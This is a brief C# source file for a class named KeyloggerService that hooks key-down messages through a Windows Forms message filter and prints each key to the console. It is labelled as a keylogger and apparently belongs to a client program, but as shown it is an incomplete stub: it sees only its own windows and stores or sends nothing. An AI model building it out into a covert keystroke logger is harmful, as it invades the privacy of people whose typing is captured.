using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    class KeyloggerService
    {
        public static string Logs = "";

        public static void Start()
        {
            Application.AddMessageFilter(new KeyFilter());
        }

        private class KeyFilter : IMessageFilter
        {
            public bool PreFilterMessage(ref Message m)
            {
                

                if(m.Msg == 0x0100)
                {
                    Keys key = (Keys)m.WParam;
                    Console.WriteLine(key.ToString());

                }

                return false;
            }
        }
    }
}
